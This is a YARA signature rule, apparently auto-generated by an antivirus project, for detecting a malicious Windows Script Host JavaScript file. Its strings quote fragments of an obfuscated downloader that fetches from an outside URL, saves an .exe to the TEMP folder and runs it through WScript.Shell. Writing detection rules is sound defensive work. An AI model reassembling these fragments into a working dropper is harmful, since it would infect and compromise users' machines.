rule sig_20160330_92bd2881739e55dee6566eb960d1a6e2 {
  meta:
    description = "datamaliciousorder - file 20160330_92bd2881739e55dee6566eb960d1a6e2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "72fca427f2f080d01dd8cc3f86dd3f8cfc5588dfa2e3d0d61e544a7fc1ac69a0"

  strings:
    $s1  = "_VX[_A](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "var _IA = function _FO() {return WScript[_FK](\"WScript\"+\".Shell\");}(), _FF = 11;" fullword ascii
    $s3  = "function _H(_DI, _PK){_UC = _UC * 1; return _DI - _PK;};" fullword ascii
    $s4  = "if (_VX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U() {return _IA[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NVGXJ1F9qfe.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Q(){return _X + \"\";};" fullword ascii
    $s7  = "function _IS(_RS){_IA[\"Run\"](_RS, _UC, _UC);};" fullword ascii
    $s8  = "function _BY() {return ((_VI == true) && (_VI == _C0)) ? 1 : _UC;};" fullword ascii
    $s9  = "function _U0()" fullword ascii
    $s10 = " while (_JH){" fullword ascii
    $s11 = "function _PN(_GB) {var _B = (1, 2, 3, 4, 5, _GB); return _B;};" fullword ascii
    $s12 = "var _FZ = new this[\"Date\"]();" fullword ascii
    $s13 = "function _PB(){return _FK;};" fullword ascii
    $s14 = "function _CX(){return 22;};" fullword ascii
    $s15 = "return _H(_G, _V);" fullword ascii
    $s16 = "var _C0 = false;" fullword ascii
    $s17 = "_C0 = true; " fullword ascii
    $s18 = "var _B0 = false;" fullword ascii
    $s19 = "var _VI = false;" fullword ascii
    $s20 = "_VI = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}